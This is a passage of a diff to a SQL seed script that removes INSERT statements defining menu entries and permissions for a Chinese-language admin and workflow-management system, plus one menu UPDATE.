-VALUES(2011, '导出权限', 2003, 2, '', '', '', 1, 0, 'F', '0', '0', 'config:project:export', '#', 'SSSDNSY', '2023-03-27 16:08:48', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2012, '查询权限', 2003, 3, '', '', '', 1, 0, 'F', '0', '0', 'config:project:list', '#', 'admin', '2023-03-27 16:18:27', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2015, '流程管理', 0, 10, 'flow', '', '', 1, 0, 'M', '0', '0', '', 'edit', 'SSSDNSY', '2023-06-23 18:17:20', 'admin', '2023-07-12 11:10:30', '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2016, '流程编辑', 2015, 1, 'flowEditor', 'bpmn/flow/definition/flowEditor', '', 1, 0, 'C', '0', '0', '', 'documentation', 'admin', '2023-06-23 19:41:08', 'admin', '2023-07-12 11:09:36', '2016	模型管理	2015	1	modelList	activiti/ModelList		1	0	C	0	0		documentation	admin	2023-06-23 19:41:08	admin	2023-06-23 19:41:47	');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2018, '表单管理', 0, 8, 'form', '', '', 1, 0, 'M', '0', '0', '', 'form', 'admin', '2023-07-06 19:53:27', 'admin', '2023-07-12 11:10:26', '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2019, '表单管理', 2018, 1, 'formManager', 'bpmn/form/FormManager', '', 1, 0, 'C', '0', '0', '', 'build', 'admin', '2023-07-06 19:56:51', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2020, '流程监控', 0, 15, 'flowMonitor', '', '', 1, 0, 'M', '0', '0', '', 'cascader', 'admin', '2023-07-12 11:11:44', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2021, '实例管理', 2020, 1, 'instManager', '/bpmn/inst/InstManager', '', 1, 0, 'C', '0', '0', '', 'druid', 'admin', '2023-07-12 11:13:45', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2022, '任务管理', 2020, 5, 'taskManager', 'bpmn/task/TaskManager', '', 1, 0, 'C', '0', '0', '', 'documentation', 'admin', '2023-07-12 11:14:25', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2023, '统计分析', 2020, 15, 'statistics', 'bpmn/stat/Statistics', '', 1, 0, 'C', '0', '0', '', 'chart', 'admin', '2023-07-12 11:15:33', '', NULL, '');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2024, '流程设计', 2015, 1, 'flowDesigner', 'bpmn/flow/definition/index', '', 1, 0, 'C', '0', '0', '', 'documentation', 'admin', '2023-06-23 19:41:08', 'admin', '2023-07-12 11:09:36', '2016	模型管理	2015	1	modelList	activiti/ModelList		1	0	C	0	0		documentation	admin	2023-06-23 19:41:08	admin	2023-06-23 19:41:47	');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2025, '流程分类', 2015, 1, 'flowCategory', 'bpmn/flow/category/index', '', 1, 0, 'C', '0', '0', '', 'documentation', 'admin', '2023-06-23 19:41:08', 'admin', '2023-07-12 11:09:36', '2016	模型管理	2015	1	modelList	activiti/ModelList		1	0	C	0	0		documentation	admin	2023-06-23 19:41:08	admin	2023-06-23 19:41:47	');
-INSERT INTO melon.sys_menu
-(menu_id, menu_name, parent_id, order_num, `path`, component, query, is_frame, is_cache, menu_type, visible, status, perms, icon, create_by, create_time, update_by, update_time, remark)
-VALUES(2026, '数据同步', 3, 10, 'dataSync', 'system/sync/index', '', 1, 0, 'C', '0', '0', '', 'server', 'admin', '2023-07-17 13:55:08', '', NULL, '');
-
-UPDATE melon.sys_menu
-SET `path`='knife4j',component='tool/knife4j/index'
-WHERE menu_id=117
 
 INSERT INTO melon.sys_notice (notice_title, notice_type, notice_content, status, create_by, create_time, update_by,
                               update_time, remark)
